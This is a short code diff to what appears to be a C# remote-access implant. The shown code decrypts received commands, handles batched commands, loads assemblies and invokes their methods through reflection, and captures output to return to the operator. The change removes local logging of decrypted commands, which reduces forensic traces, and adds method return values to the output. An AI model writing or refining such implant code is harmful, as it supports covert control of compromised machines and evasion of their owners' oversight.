@@ -317,10 +317,6 @@ public class Program
           x = Decryption(Key, cmd);
           x  = x.Replace("\0", string.Empty);
         } catch {}
-        using (System.IO.StreamWriter file = new System.IO.StreamWriter(@"C:\temp\log.txt", true))
-        {
-          file.WriteLine(x.ToString().TrimEnd());
-        }
         if (x.ToLower().StartsWith("multicmd"))
       	{
           string splitcmd = x.Replace("multicmd","");
@@ -406,7 +402,7 @@ public class Program
             			Console.SetOut(stringOutput);
             			var loadedType = LoadSomething(qualifiedname + ", " + Ass.FullName);
             			var xxx = loadedType.Assembly.GetType(qualifiedname).InvokeMember(method, BindingFlags.InvokeMethod, null, null, null);
-            			output = stringOutput.ToString();
+            			output = xxx.ToString() + stringOutput.ToString();
             		}
             	}
             }
